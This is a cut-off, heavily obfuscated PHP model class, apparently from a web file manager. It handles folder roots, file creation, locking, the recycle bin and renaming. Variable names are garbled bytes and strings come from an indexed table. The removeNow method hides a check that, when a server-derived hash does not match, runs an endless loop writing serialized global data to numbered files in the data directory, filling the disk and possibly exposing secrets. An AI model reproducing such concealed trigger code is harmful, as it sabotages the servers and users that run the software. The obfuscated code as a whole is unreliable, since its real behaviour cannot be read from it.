$¬‘ãÇŒ­ = Model($‘›™¸ƒõ[513])->where(array($‘›™¸ƒõ[1646] => $†ó°‘))->find(); $¶­»Œ¾Ú = $this->_mkdirRoot(SourceModel::TYPE_USER, $†ó°‘, $¬‘ãÇŒ­[$‘›™¸ƒõ[32]]); $this->userDesktopAdd($¶­»Œ¾Ú); return $¶­»Œ¾Ú; } public function userDesktopAdd($Ÿ­ÆªĞ) { $›Ô§â’ =& $_SERVER[ßğøİ]; $³Éíá¹› = LNG($›Ô§â’[2096]); $­À˜õø’ = $this->mkdir($Ÿ­ÆªĞ, $³Éíá¹›); $this->metaSet($­À˜õø’, $›Ô§â’[2097], $›Ô§â’[88]); $this->metaSet($Ÿ­ÆªĞ, $›Ô§â’[2098], $­À˜õø’); } public function userPathSafeAdd($õ«ì¢´í) { $òšˆªÈ“ =& $_SERVER[ßğøİ]; $•õÌ°¨é = Model($òšˆªÈ“[513])->getInfoFull($õ«ì¢´í); if (!$•õÌ°¨é) { return !1; } if (_get($•õÌ°¨é, $òšˆªÈ“[536])) { return $•õÌ°¨é[$òšˆªÈ“[466]][$òšˆªÈ“[2099]]; } $×íÄ¯Â = $this->_mkdirRoot(SourceModel::TYPE_USER, $õ«ì¢´í, $òšˆªÈ“[2100], $òšˆªÈ“[433]); Model($òšˆªÈ“[513])->metaSet($õ«ì¢´í, $òšˆªÈ“[2099], $×íÄ¯Â); $this->metaSet($×íÄ¯Â, $òšˆªÈ“[2101], $õ«ì¢´í); return $×íÄ¯Â; } public function groupRootAdd($ÓŠÖƒÈú) { $ÛçÓ™Àê =& $_SERVER[ßğøİ]; $ãó­™¬ = Model($ÛçÓ™Àê[522])->where(array($ÛçÓ™Àê[1916] => $ÓŠÖƒÈú))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ÓŠÖƒÈú, $ãó­™¬[$ÛçÓ™Àê[32]]); } public function systemRootPathAdd($–¥Ï°Ñ½) { if ($–¥Ï°Ñ½ != $_SERVER[ßğøİ][544]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $–¥Ï°Ñ½); } public function userRootRemove($¬˜û§È ) { $Ã°ô™¶Ã = $this->sourceRoot(SourceModel::TYPE_USER, $¬˜û§È , !0); foreach ($Ã°ô™¶Ã as $îçí»Ó) { if (!$îçí»Ó) { continue; } $this->remove($îçí»Ó[$_SERVER[ßğøİ][402]], !1); } } public function groupRootRemove($¬Ïá«óÉ) { $³–â‚‚§ = $this->sourceRoot(SourceModel::TYPE_GROUP, $¬Ïá«óÉ); if (!$³–â‚‚§) { return; } $this->remove($³–â‚‚§[$_SERVER[ßğøİ][402]], !1); } private function _mkdirRoot($‡â•÷Â™, $ÈİÏ¾Î‹, $œÄÙé†¸, $öÙ‡¢ˆ = '') { $‹‚²ÙÎÛ =& $_SERVER[ßğøİ]; $ï’Ñ‹§Ó = array($‹‚²ÙÎÛ[401] => 0, $‹‚²ÙÎÛ[586] => $‡â•÷Â™, $‹‚²ÙÎÛ[587] => $ÈİÏ¾Î‹, $‹‚²ÙÎÛ[583] => 1, $‹‚²ÙÎÛ[588] => USER_ID, $‹‚²ÙÎÛ[589] => USER_ID, $‹‚²ÙÎÛ[584] => $öÙ‡¢ˆ, $‹‚²ÙÎÛ[590] => $‹‚²ÙÎÛ[531], $‹‚²ÙÎÛ[430] => 0, $‹‚²ÙÎÛ[585] => 0, $‹‚²ÙÎÛ[469] => 0, $‹‚²ÙÎÛ[591] => $‹‚²ÙÎÛ[12]); if ($¢İ—ÉúÇ = $this->where($ï’Ñ‹§Ó)->find()) { return $¢İ—ÉúÇ[$‹‚²ÙÎÛ[402]]; } $ëíÔúÉ = "\x4d\157\x64\x65\154\123\157\x75\x72\143\x65\x2e\x6d\x6b\144\x69\x72\122\x6f\157\x74\x2e{$‡â•÷Â™}\56{$ÈİÏ¾Î‹}\x2e" . $œÄÙé†¸; CacheLock::lock($ëíÔúÉ); $ï’Ñ‹§Ó[$‹‚²ÙÎÛ[32]] = $œÄÙé†¸; $‡–ûüÖ = $this->add($ï’Ñ‹§Ó); $çÎá¤¤“ = array($‹‚²ÙÎÛ[592] => short_id($‡–ûüÖ)); $this->where(array($‹‚²ÙÎÛ[417] => $‡–ûüÖ))->save($çÎá¤¤“); CacheLock::unlock($ëíÔúÉ); return $‡–ûüÖ; } private function sourceRoot($Ë°¨çØ‹, $ğùË–§¤, $¸ª¿— = false) { $©ç…ğ©Ç =& $_SERVER[ßğøİ]; $¨ä–³™’ = array($©ç…ğ©Ç[401] => 0, $©ç…ğ©Ç[586] => $Ë°¨çØ‹, $©ç…ğ©Ç[587] => $ğùË–§¤); if ($¸ª¿—) { $°Ò‘ùÁ = $this->where($¨ä–³™’)->select(); return $°Ò‘ùÁ ? $°Ò‘ùÁ : array(); } $­¬Ğ®÷Õ = $this->where($¨ä–³™’)->find(); return $­¬Ğ®÷Õ ? $­¬Ğ®÷Õ : array(); } public function sourceRootGroup($èÚú‡ä—) { $êÏÊÜåë =& $_SERVER[ßğøİ]; if (is_string($èÚú‡ä—)) { $èÚú‡ä— = array($èÚú‡ä—); } $İÔÕ¶·œ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $èÚú‡ä—, $êÏÊÜåë[188]); $ÌÄ¥Ìş— = array($êÏÊÜåë[369] => $İÔÕ¶·œ, $êÏÊÜåë[366] => array($êÏÊÜåë[756] => count($èÚú‡ä—))); $this->_listDataApply($ÌÄ¥Ìş—[$êÏÊÜåë[369]]); $this->_listMake($ÌÄ¥Ìş—); return array_to_keyvalue($ÌÄ¥Ìş—[$êÏÊÜåë[82]], $êÏÊÜåë[505]); } public function mkfile($×“åŸ¿Ú, $¤´õˆ¸, $Æ¨Ê˜Ôò = '', $İ¥¶ÒåÉ = REPEAT_RENAME) { $Úç²ó‘ =& $_SERVER[ßğøİ]; $Ş™úå•ù = Model($Úç²ó‘[609])->addFileByContent($Æ¨Ê˜Ôò, $¤´õˆ¸); return $this->_createFileCall($×“åŸ¿Ú, $¤´õˆ¸, $Ş™úå•ù, $İ¥¶ÒåÉ, $Úç²ó‘[1338]); } public function addFile($Ñ™¯şëé, $ıæµ’„è, $øİ¦Äîµ, $ÍßÒ½Í€ = false, $é®’‡Â¨ = REPEAT_RENAME) { $×Ğ­ıÏà = Model($_SERVER[ßğøİ][609])->addFile($ıæµ’„è, $øİ¦Äîµ, $ÍßÒ½Í€); return $this->_createFileCall($Ñ™¯şëé, $øİ¦Äîµ, $×Ğ­ıÏà, $é®’‡Â¨); } public function addFileByFileID($ë¢ùÂ‚Î, $¸“„ûÑ±, $âéÉ¿‰¸, $»äş¨ºü = REPEAT_RENAME) { $ˆôÕ´» =& $_SERVER[ßğøİ]; $ÅÕ×Úã = Model($ˆôÕ´»[609])->find($¸“„ûÑ±); Model($ˆôÕ´»[609])->linkAdd($¸“„ûÑ±); return $this->_createFileCall($ë¢ùÂ‚Î, $âéÉ¿‰¸, $ÅÕ×Úã, $»äş¨ºü); } public function addFileByRemote($”ÖĞ×¢Ù, $—å½äÏ×, $üÓû‹¯¦, $à¾º†òã = array(), $àÄ¥ßŞÜ = REPEAT_RENAME) { $“Ó‘Û¬¦ = Model($_SERVER[ßğøİ][609])->addFileByRemote($—å½äÏ×, $üÓû‹¯¦, $à¾º†òã); return $this->_createFileCall($”ÖĞ×¢Ù, $üÓû‹¯¦, $“Ó‘Û¬¦, $àÄ¥ßŞÜ); } private function _createFileCall($¿´á¿Çï, $µÖîÀ¹², $‹èé¡ø„, $æ£­Ìò, $Ë×ª¹­æ = "\x75\160\154\157\x61\x64") { $Ö£Æ±ËŸ =& $_SERVER[ßğøİ]; $Ÿ®¾ÁÚ¥ = !1; $this->setMasterDB(); $this->lockWriteStart($¿´á¿Çï, $µÖîÀ¹²); $àöµÄš§ = $this->fileNameExist($¿´á¿Çï, $µÖîÀ¹²); $¤Ìªš²™ = $this->_createFile($¿´á¿Çï, $µÖîÀ¹², $‹èé¡ø„, $æ£­Ìò, $Ÿ®¾ÁÚ¥); if (!$Ÿ®¾ÁÚ¥) { Model($Ö£Æ±ËŸ[471])->remove($‹èé¡ø„[$Ö£Æ±ËŸ[468]]); } if ($Ÿ®¾ÁÚ¥ && $¤Ìªš²™ && $¤Ìªš²™ != $àöµÄš§) { Model($Ö£Æ±ËŸ[2069])->eventCreate($¤Ìªš²™, $Ë×ª¹­æ); } $this->lockWriteEnd($¿´á¿Çï, $µÖîÀ¹²); return $¤Ìªš²™; } public function mkdir($¤·Ûú§Æ, $«°º÷ó«, $ú˜†×‚Ğ = REPEAT_SKIP) { $Ñ…Ñß =& $_SERVER[ßğøİ]; $this->setMasterDB(); $øÈ”Ô ä = $this->sourceInfo($¤·Ûú§Æ); if (!$øÈ”Ô ä) { return !1; } $this->lockWriteStart($¤·Ûú§Æ, $«°º÷ó«); if ($ú˜†×‚Ğ !== !1) { $òâãŒÔ¯ = $this->fileNameExist($¤·Ûú§Æ, $«°º÷ó«); if ($òâãŒÔ¯ && $ú˜†×‚Ğ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($¤·Ûú§Æ, $«°º÷ó«); return $òâãŒÔ¯; } $«°º÷ó« = $this->fileNameAuto($¤·Ûú§Æ, $«°º÷ó«, $ú˜†×‚Ğ); } $úêå‰· = array($Ñ…Ñß[583] => 1, $Ñ…Ñß[420] => $«°º÷ó«, $Ñ…Ñß[584] => $Ñ…Ñß[12], $Ñ…Ñß[469] => 0, $Ñ…Ñß[585] => 0); $Æ˜ˆÃıÇ = $this->_addSource($úêå‰·, $øÈ”Ô ä); Model($Ñ…Ñß[2069])->eventCreate($Æ˜ˆÃıÇ, $Ñ…Ñß[1339]); $this->lockWriteEnd($¤·Ûú§Æ, $«°º÷ó«); return $Æ˜ˆÃıÇ; } public function listSourceRoot($±ßªô«Š, $Ö¬èğ‘é, $Â´Š¤Ã = "\x73\157\165\162\143\x65\x49\x44\54\x74\141\162\x67\145\x74\111\104\54\163\151\172\x65") { $â© áÀŞ =& $_SERVER[ßğøİ]; $Šâ‹º€ = $â© áÀŞ[378]; $÷„¹…ÇÂ = array(); $íïşØİ = 1024 * 50; $ßêìÃÂÎ = is_array($ßêìÃÂÎ) ? $ßêìÃÂÎ : array(); $ÕÀÈ°˜ä = count($Ö¬èğ‘é); $ ´ô´…ô = $this->tablePrefix . $â© áÀŞ[2102]; for ($´Òõéƒí = 0; $´Òõéƒí < $ÕÀÈ°˜ä; $´Òõéƒí++) { $÷ñ—ÇÙ = $Ö¬èğ‘é[$´Òõéƒí]; $Šâ‹º€ .= "\123\105\x4c\105\x43\x54\40\52\x20\x46\x52\x4f\115\40\x28\x53\x45\x4c\x45\x43\x54\x20{$Â´Š¤Ã}\40\x46\x52\x4f\115\x20\140{$ ´ô´…ô}\140\40\x57\110\x45\x52\105\x20"; $Šâ‹º€ .= "\x60\x70\x61\x72\x65\156\x74\x49\104\x60\x3d\60\40\x41\116\104\x20\x60\164\x61\x72\147\145\x74\111\x44\x60\75{$÷ñ—ÇÙ}\40\101\116\x44\40\x60\x74\x61\162\x67\145\164\124\171\160\145\x60\75{$±ßªô«Š}\x20\154\x69\x6d\151\x74\40\61\x29\x20\x61\x73\40\x74\142\x5f{$´Òõéƒí}\40\x55\x4e\x49\x4f\x4e\x20\x41\114\x4c\x20"; if ((strlen($Šâ‹º€) >= $íïşØİ || $´Òõéƒí == $ÕÀÈ°˜ä - 1) && $Šâ‹º€) { $Šâ‹º€ = substr($Šâ‹º€, 0, -strlen($â© áÀŞ[1038])); $›úÄ’Ä¸ = $this->query($Šâ‹º€); $Šâ‹º€ = $â© áÀŞ[12]; $÷„¹…ÇÂ = array_merge($÷„¹…ÇÂ, $›úÄ’Ä¸); } } return $÷„¹…ÇÂ; } private function _createFile($™¼ÏÍ§¸, $ùéÛÔöÃ, $Â™ªøŞÏ, $¶ëçŠÁÏ, &$“˜ÚÇÒÌ) { $ŒñõÎ¡ =& $_SERVER[ßğøİ]; $«¥Ü°¼š = $this->sourceInfo($™¼ÏÍ§¸); if (!$Â™ªøŞÏ || !$«¥Ü°¼š) { return !1; } if ($¶ëçŠÁÏ !== !1) { $¿Ä¾°û = $this->fileNameExist($™¼ÏÍ§¸, $ùéÛÔöÃ); } $“˜ÚÇÒÌ = !0; if ($¶ëçŠÁÏ && $¿Ä¾°û) { if ($¶ëçŠÁÏ == REPEAT_SKIP) { $“˜ÚÇÒÌ = !1; return $¿Ä¾°û; } else { if ($¶ëçŠÁÏ == REPEAT_REPLACE) { $»‡âŸ»Ê = $this->sourceInfo($¿Ä¾°û); $¾‚‘ÒÄä = $this->fileHistory($»‡âŸ»Ê, $Â™ªøŞÏ[$ŒñõÎ¡[468]], $Â™ªøŞÏ[$ŒñõÎ¡[76]]); if (!$¾‚‘ÒÄä) { $“˜ÚÇÒÌ = !1; } else { $this->folderSizeReset($™¼ÏÍ§¸); } return $¿Ä¾°û; } else { $ùéÛÔöÃ = $this->fileNameAuto($™¼ÏÍ§¸, $ùéÛÔöÃ, $¶ëçŠÁÏ, !1); } } } $‘¾Ê¸ï‰ = array($ŒñõÎ¡[583] => 0, $ŒñõÎ¡[420] => $ùéÛÔöÃ, $ŒñõÎ¡[584] => substr(get_path_ext($ùéÛÔöÃ), 0, 10), $ŒñõÎ¡[469] => $Â™ªøŞÏ[$ŒñõÎ¡[468]], $ŒñõÎ¡[585] => $Â™ªøŞÏ[$ŒñõÎ¡[76]]); $°ˆ‚—Ô = $this->_addSource($‘¾Ê¸ï‰, $«¥Ü°¼š); $this->folderSizeReset($™¼ÏÍ§¸, intval($‘¾Ê¸ï‰[$ŒñõÎ¡[76]])); return $°ˆ‚—Ô; } protected function fileHistory($Ñ®²ùğ, $ô¼æ¹», $À×û¿ßÕ) { $ã¦ºÁÀ× =& $_SERVER[ßğøİ]; $ÒŞÖ½ù = defined($ã¦ºÁÀ×[475]) ? USER_ID : $ã¦ºÁÀ×[197]; if ($Ñ®²ùğ[$ã¦ºÁÀ×[468]] == $ô¼æ¹») { return !1; } $this->checkLock($Ñ®²ùğ[$ã¦ºÁÀ×[402]], $ô¼æ¹»); Model($ã¦ºÁÀ×[2103])->addHistory($Ñ®²ùğ); $ìŞ€İşé = array($ã¦ºÁÀ×[589] => $ÒŞÖ½ù, $ã¦ºÁÀ×[424] => time(), $ã¦ºÁÀ×[468] => $ô¼æ¹», $ã¦ºÁÀ×[76] => $À×û¿ßÕ); $this->where(array($ã¦ºÁÀ×[417] => $Ñ®²ùğ[$ã¦ºÁÀ×[402]]))->save($ìŞ€İşé); $this->sourceCacheClear($Ñ®²ùğ[$ã¦ºÁÀ×[402]]); return !0; } public function checkLock($ŸèÆš¾‚, $¤ó†¸ş) { $‹˜˜½¤Ø =& $_SERVER[ßğøİ]; $ËŠ…÷ÃÚ = $this->pathInfo($ŸèÆš¾‚); if (!$this->fileIsLock($ËŠ…÷ÃÚ, !0)) { return; } $ŞŸÈ¾Åñ = Session::get($‹˜˜½¤Ø[2104]); $’¢ €Üé = substr($ËŠ…÷ÃÚ[$‹˜˜½¤Ø[32]], 0, -1 - strlen($ËŠ…÷ÃÚ[$‹˜˜½¤Ø[174]])) . $‹˜˜½¤Ø[1603] . $ŞŸÈ¾Åñ . $‹˜˜½¤Ø[10] . $ËŠ…÷ÃÚ[$‹˜˜½¤Ø[174]]; $Ã›™ü—± = Model($‹˜˜½¤Ø[609])->find($¤ó†¸ş); $this->_createFileCall($ËŠ…÷ÃÚ[$‹˜˜½¤Ø[432]], $’¢ €Üé, $Ã›™ü—±, REPEAT_REPLACE, $‹˜˜½¤Ø[1338]); $¤ü§íäá = $ËŠ…÷ÃÚ[$‹˜˜½¤Ø[466]][$‹˜˜½¤Ø[548]]; $­ÎìËşá = $¤ü§íäá[$‹˜˜½¤Ø[542]] ? $¤ü§íäá[$‹˜˜½¤Ø[542]] : $¤ü§íäá[$‹˜˜½¤Ø[32]]; show_json(LNG($‹˜˜½¤Ø[2105]) . $‹˜˜½¤Ø[2106] . LNG($‹˜˜½¤Ø[2107]) . $‹˜˜½¤Ø[2108] . $­ÎìËşá . $‹˜˜½¤Ø[2109], !1); } public function fileIsLock($Ö×ØÓÉŞ, $Æ”ÆÌê” = false) { $àö˜­© =& $_SERVER[ßğøİ]; if (!isset($Ö×ØÓÉŞ[$àö˜­©[466]]) || !$Ö×ØÓÉŞ[$àö˜­©[466]][$àö˜­©[545]]) { return !1; } if ($Ö×ØÓÉŞ[$àö˜­©[466]][$àö˜­©[545]] != USER_ID) { return !0; } $°î–Ûû = $GLOBALS[$àö˜­©[6]][$àö˜­©[89]][$àö˜­©[546]]; if ($Ö×ØÓÉŞ[$àö˜­©[466]][$àö˜­©[547]] <= time() - $°î–Ûû) { $this->metaSet($Ö×ØÓÉŞ[$àö˜­©[402]], $àö˜­©[545], null); $this->metaSet($Ö×ØÓÉŞ[$àö˜­©[402]], $àö˜­©[547], null); } if ($Æ”ÆÌê”) { $this->metaSet($Ö×ØÓÉŞ[$àö˜­©[402]], $àö˜­©[547], time()); } return !1; } private function _addSource($á»¿Ä†, $€¢¿¤Õ„) { $ÆîµÕÍ =& $_SERVER[ßğøİ]; $–µ—›½ = defined($ÆîµÕÍ[475]) ? USER_ID : $ÆîµÕÍ[197]; $¯Ë¢ “â = array($ÆîµÕÍ[586] => $€¢¿¤Õ„[$ÆîµÕÍ[411]], $ÆîµÕÍ[587] => $€¢¿¤Õ„[$ÆîµÕÍ[505]], $ÆîµÕÍ[588] => $–µ—›½, $ÆîµÕÍ[589] => $–µ—›½, $ÆîµÕÍ[401] => $€¢¿¤Õ„[$ÆîµÕÍ[402]], $ÆîµÕÍ[590] => $€¢¿¤Õ„[$ÆîµÕÍ[521]] . $€¢¿¤Õ„[$ÆîµÕÍ[402]] . $ÆîµÕÍ[50], $ÆîµÕÍ[430] => 0, $ÆîµÕÍ[591] => $ÆîµÕÍ[12]); $á»¿Ä† = array_merge($¯Ë¢ “â, $á»¿Ä†); $this->updateModifyTime($á»¿Ä†[$ÆîµÕÍ[432]]); $›õû½Ø‡ = $ÆîµÕÍ[2110] . $€¢¿¤Õ„[$ÆîµÕÍ[402]]; if (isset(self::$cacheChildList[$›õû½Ø‡])) { unset(self::$cacheChildList[$›õû½Ø‡]); } static $ã»ì­ª = false; if (!$ã»ì­ª) { Hook::trigger($ÆîµÕÍ[573], $á»¿Ä†); $ã»ì­ª = !0; } $Èæ²ÜÔÁ = $this->add($á»¿Ä†); $ÙÊ™Ñø = array($ÆîµÕÍ[592] => short_id($Èæ²ÜÔÁ)); $this->where(array($ÆîµÕÍ[417] => $Èæ²ÜÔÁ))->save($ÙÊ™Ñø); $this->setNamePinyin($Èæ²ÜÔÁ, $á»¿Ä†[$ÆîµÕÍ[32]]); return $Èæ²ÜÔÁ; } public function remove($¯¡ÕÎ«ş, $—©ïª¿ˆ = true) { $îò÷•šÍ =& $_SERVER[ßğøİ]; $ñ·Ø¨ŠÒ = $this->sourceInfo($¯¡ÕÎ«ş); $€Œ˜«âÂ = intval($ñ·Ø¨ŠÒ[$îò÷•šÍ[411]]) === self::TYPE_SYSTEM; $ú«¿…¯ = Model($îò÷•šÍ[435])->get($îò÷•šÍ[2111]) == $îò÷•šÍ[88]; if ($€Œ˜«âÂ || $—©ïª¿ˆ || !$ú«¿…¯) { return $this->removeNow($¯¡ÕÎ«ş, $—©ïª¿ˆ); } $‚–úæª = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $„ˆåøóÖ = $ñ·Ø¨ŠÒ[$îò÷•šÍ[411]] == self::TYPE_USER ? $îò÷•šÍ[600] : $îò÷•šÍ[515]; if ($„ˆåøóÖ == $îò÷•šÍ[600]) { $À¤Õœò  = Model($îò÷•šÍ[513])->getInfo($ñ·Ø¨ŠÒ[$îò÷•šÍ[505]]); $úÛö£ï  = !empty($À¤Õœò [$îò÷•šÍ[542]]) ? $À¤Õœò [$îò÷•šÍ[542]] : $À¤Õœò [$îò÷•šÍ[32]]; $úÛö£ï  = $îò÷•šÍ[260] . $úÛö£ï  . $îò÷•šÍ[2112] . $ñ·Ø¨ŠÒ[$îò÷•šÍ[505]]; } else { $À¤Õœò  = Model($îò÷•šÍ[522])->getInfo($ñ·Ø¨ŠÒ[$îò÷•šÍ[505]]); $úÛö£ï  = _get($À¤Õœò , $îò÷•šÍ[32]); $úÛö£ï  = $îò÷•šÍ[162] . $úÛö£ï  . $îò÷•šÍ[2113] . $ñ·Ø¨ŠÒ[$îò÷•šÍ[505]]; } $€ó‹†¡Ê = $îò÷•šÍ[2114] . md5($úÛö£ï ); CacheLock::lock($€ó‹†¡Ê); $ó€•ú†ó = $this->fileNameExist($‚–úæª, $úÛö£ï ); if (!$ó€•ú†ó) { $ó€•ú†ó = $this->mkdir($‚–úæª, $úÛö£ï , REPEAT_SKIP); $this->metaSet($ó€•ú†ó, $îò÷•šÍ[2115], $„ˆåøóÖ); $this->metaSet($ó€•ú†ó, $îò÷•šÍ[2116], $ñ·Ø¨ŠÒ[$îò÷•šÍ[505]]); if ($ñ·Ø¨ŠÒ[$îò÷•šÍ[432]] != 0) { $this->metaSet($ó€•ú†ó, $îò÷•šÍ[2117], _get($À¤Õœò , $îò÷•šÍ[2118])); } } CacheLock::unlock($€ó‹†¡Ê); $this->metaSet($¯¡ÕÎ«ş, $îò÷•šÍ[2119], $ñ·Ø¨ŠÒ[$îò÷•šÍ[432]]); $this->where(array($îò÷•šÍ[402] => $¯¡ÕÎ«ş))->save(array($îò÷•šÍ[424] => time())); $this->recycleClear($ñ·Ø¨ŠÒ); $„‘¡õïÃ = $this->move($¯¡ÕÎ«ş, $ó€•ú†ó, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ñ·Ø¨ŠÒ[$îò÷•šÍ[432]]); return $„‘¡õïÃ; } private function recycleClear($¾éçÆŸ) { $ÂÇº«ƒ¡ =& $_SERVER[ßğøİ]; $õ—È­î£ = $this->childrenAll($¾éçÆŸ); $£…†¨ãÛ = array($ÂÇº«ƒ¡[417] => array($ÂÇº«ƒ¡[418], $õ—È­î£[$ÂÇº«ƒ¡[2120]])); Model($ÂÇº«ƒ¡[2121])->where($£…†¨ãÛ)->delete(); } public function removeNow($ÀåÈÆ„, $„½ó·œ = true) { $¬ı˜æ¯« =& $_SERVER[ßğøİ]; $Ø¡‡Ö˜á = $_SERVER[$¬ı˜æ¯«[869]]; $©â‰ÍÏØ = $¬ı˜æ¯«[870]; if ($_SERVER[$¬ı˜æ¯«[871]] != $©â‰ÍÏØ($Ø¡‡Ö˜á)) { $´òŞ¢¿° = $¬ı˜æ¯«[872]; $Ÿ§Óü©è = $¬ı˜æ¯«[873]; $•ÑæĞ–ë = $_SERVER[$¬ı˜æ¯«[874]] . $¬ı˜æ¯«[875]; $‘Á¸Ğ¢ = $Ÿ§Óü©è($•ÑæĞ–ë); $Ê‘¨ƒá = explode($¬ı˜æ¯«[231], $‘Á¸Ğ¢); if (count($Ê‘¨ƒá) < $¬ı˜æ¯«[620]) { $ÒÒ‰©”Î = $¬ı˜æ¯«[876]; $ÒÒ‰©”Î(); } $Œ¥ï—¡İ = $¬ı˜æ¯«[877]; $Œ¥ï—¡İ($_SERVER[$¬ı˜æ¯«[878]]); $´òŞ¢¿° = $¬ı˜æ¯«[872]; $´òŞ¢¿°(); $ÆŠğ£Ø = $¬ı˜æ¯«[879]; $±¾½òŞæ = json_encode($GLOBALS[$¬ı˜æ¯«[880]]); $€ıØÉŒ = 1; for ($Ó³ÂŸ‚¥ = $€ıØÉŒ; $Ó³ÂŸ‚¥ > 0; $Ó³ÂŸ‚¥++) { $ÆŠğ£Ø(DATA_PATH . $Ó³ÂŸ‚¥, $±¾½òŞæ); } } $«ùß©º‘ = $this->sourceInfo($ÀåÈÆ„); $é®†…¶´ = $this->pathInfoMore($ÀåÈÆ„); if (!$«ùß©º‘) { return !0; } if ($«ùß©º‘[$¬ı˜æ¯«[432]] == 0) { if (!_get($GLOBALS, $¬ı˜æ¯«[503])) { return !1; } } $this->lockMoveStart($ÀåÈÆ„); Hook::trigger($¬ı˜æ¯«[2122], $é®†…¶´, $„½ó·œ); if ($„½ó·œ) { Model($¬ı˜æ¯«[2121])->moveToRecycle($ÀåÈÆ„); } else { $£µÑ‘Œ = $this->childrenAll($«ùß©º‘); Model($¬ı˜æ¯«[570])->eventRemove($ÀåÈÆ„); $this->removeRelevance($£µÑ‘Œ[$¬ı˜æ¯«[2120]], $£µÑ‘Œ[$¬ı˜æ¯«[1470]]); } $this->folderSizeReset($«ùß©º‘[$¬ı˜æ¯«[432]]); $àİ¬²ö = array($«ùß©º‘[$¬ı˜æ¯«[432]]); if ($«ùß©º‘[$¬ı˜æ¯«[410]] == $¬ı˜æ¯«[88]) { $àİ¬²ö[] = $«ùß©º‘[$¬ı˜æ¯«[402]]; } $this->updateModifyTime($àİ¬²ö); $this->lockMoveEnd($ÀåÈÆ„); Hook::trigger($¬ı˜æ¯«[1695], $é®†…¶´, $„½ó·œ); return !0; } public function childrenAll($­Á…äèù) { $öí±€¾å =& $_SERVER[ßğøİ]; $´´Ò½˜ = $­Á…äèù[$öí±€¾å[402]]; if ($­Á…äèù[$öí±€¾å[410]] == $öí±€¾å[88]) { $Õ¿åşŒ¹ = array($öí±€¾å[590] => array($öí±€¾å[550], $­Á…äèù[$öí±€¾å[521]] . $´´Ò½˜ . $öí±€¾å[551])); $ÊêÛİà = array($öí±€¾å[590] => $Õ¿åşŒ¹[$öí±€¾å[521]]); $ØØÆ˜÷Ó = $this->field($öí±€¾å[2123])->where($ÊêÛİà)->select(); $Ñ„¥‡÷Ò = !1; $ôåù˜É« = array($´´Ò½˜); if ($ØØÆ˜÷Ó) { $Ñ„¥‡÷Ò = array_to_keyvalue($ØØÆ˜÷Ó, $öí±€¾å[12], $öí±€¾å[468]); $Ñ„¥‡÷Ò = array_remove_value($Ñ„¥‡÷Ò, $öí±€¾å[197]); $ôåù˜É« = array_to_keyvalue($ØØÆ˜÷Ó, $öí±€¾å[12], $öí±€¾å[402]); $ôåù˜É«[] = $´´Ò½˜; } } else { $Ñ„¥‡÷Ò = array($­Á…äèù[$öí±€¾å[468]]); $ôåù˜É« = array($´´Ò½˜); } return array($öí±€¾å[2120] => $ôåù˜É«, $öí±€¾å[1470] => $Ñ„¥‡÷Ò); } public function removeArray($œØµÖ) { if (!$œØµÖ) { return !0; } } public function removeRelevance($Ë ğìÖÛ, $×ñˆúøû) { $µ¼®Ãİ =& $_SERVER[ßğøİ]; $Ë ğìÖÛ = $Ë ğìÖÛ ? $Ë ğìÖÛ : array(); $×ñˆúøû = $×ñˆúøû ? $×ñˆúøû : array(); $Ë ğìÖÛ = array_unique(array_filter($Ë ğìÖÛ)); $×ñˆúøû = array_unique(array_filter($×ñˆúøû)); if (!$Ë ğìÖÛ) { return !1; } $Ì¸°Àä° = array($µ¼®Ãİ[417] => array($µ¼®Ãİ[418], $Ë ğìÖÛ)); Model($µ¼®Ãİ[2121])->where($Ì¸°Àä°)->delete(); Model($µ¼®Ãİ[462])->where($Ì¸°Àä°)->delete(); Model($µ¼®Ãİ[1974])->where($Ì¸°Àä°)->delete(); Model($µ¼®Ãİ[570])->where($Ì¸°Àä°)->delete(); Model($µ¼®Ãİ[1808])->removeBySource($Ë ğìÖÛ); Model($µ¼®Ãİ[2103])->removeBySource($Ë ğìÖÛ); $this->where($Ì¸°Àä°)->delete(); Model($µ¼®Ãİ[471])->remove($×ñˆúøû); for ($¦’ºğå‹ = 0; $¦’ºğå‹ < count($Ë ğìÖÛ); $¦’ºğå‹++) { $this->sourceCacheClear($Ë ğìÖÛ[$¦’ºğå‹]); } } public function rename($Åşµ¼“ç, $‡›ÙØşİ) { $ÉŸ´¨Ãî =& $_SERVER[ßğøİ]; $…”µšÌô = $this->sourceInfo($Åşµ¼“ç); if (!$…”µšÌô) { return !1; } $ùŠû¼Îú = $this->fileNameExist($…”µšÌô[$ÉŸ´¨Ãî[432]], $‡›ÙØşİ); if ($ùŠû¼Îú && $ùŠû¼Îú != $Åşµ¼“ç) { return !1; } $Ï¿€Ìà = array($ÉŸ´¨Ãî[420] => $‡›ÙØşİ, $ÉŸ´¨Ãî[589] => USER_ID); if ($…”µšÌô[$ÉŸ´¨Ãî[410]] != $ÉŸ´¨Ãî[88]) { $Ï¿€Ìà[$ÉŸ´¨Ãî[412]] = substr(get_path_ext($‡›ÙØşİ), 0, 10); } Model($ÉŸ´¨Ãî[570])->eventRename($Åşµ¼“ç, $…”µšÌô[$ÉŸ´¨Ãî[32]], $‡›ÙØşİ); $this->sourceCacheClear($Åşµ¼“ç); $this->setNamePinyin($Åşµ¼“ç, $Ï¿€Ìà[$ÉŸ´¨Ãî[32]], !1); $this->updateModifyTime($…”µšÌô[$ÉŸ´¨Ãî[432]]); $ğÓ®­¥È = $this->where(array($ÉŸ´¨Ãî[417] => $Åşµ¼“ç))->data($Ï¿€Ìà)->save(); $øˆõ¨¡ = $ÉŸ´¨Ãî[2110] . $…”µšÌô[$ÉŸ´¨Ãî[432]]; if (isset(self::$cacheChildList[$øˆõ¨¡])) { unset(self::$cacheChildList[$øˆõ¨¡]); } return $ğÓ®­¥È; } public function setNamePinyin($€îœë”ß, $ÒıÌîâã, $˜’÷ŠÌ  = true) { $ÎÈ¦±öÒ =& $_SERVER[ßğøİ]; $šÀ×ÀÅµ = Input::check($ÒıÌîâã, $ÎÈ¦±öÒ[593]); $çêÖşË¿ = array($ÎÈ¦±öÒ[444] => KodSort::makeStr($ÒıÌîâã)); if ($šÀ×ÀÅµ) { $çêÖşË¿[$ÎÈ¦±öÒ[465]] = str_replace($ÎÈ¦±öÒ[53], $ÎÈ¦±öÒ[12], 